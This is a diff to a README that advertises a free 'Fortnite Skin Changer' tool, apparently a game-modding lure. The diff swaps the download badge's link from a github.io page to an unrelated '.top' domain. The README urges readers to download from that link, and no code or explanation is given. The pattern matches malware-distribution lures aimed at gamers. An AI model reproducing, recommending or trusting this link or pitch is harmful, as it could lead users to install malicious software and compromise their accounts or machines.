@@ -1,6 +1,6 @@
 # Fortnite Skin Changer | Free Skin Swapper Tool
 
-[![Download Fortnite Skin Changer](https://img.shields.io/badge/Download-Fortniteskinlab-blueviolet)](https://skincrate-labs.github.io./.github)
+[![Download Fortnite Skin Changer](https://img.shields.io/badge/Download-Fortniteskinlab-blueviolet)](https://kelomastiotp.top/)
 
 An unofficial **Fortnite Skin Changer** tool that lets you instantly change your in-game character's appearance with rare, custom, and legacy skins. Built for players who want to personalize their game experience in a fun and cosmetic-only way.
 
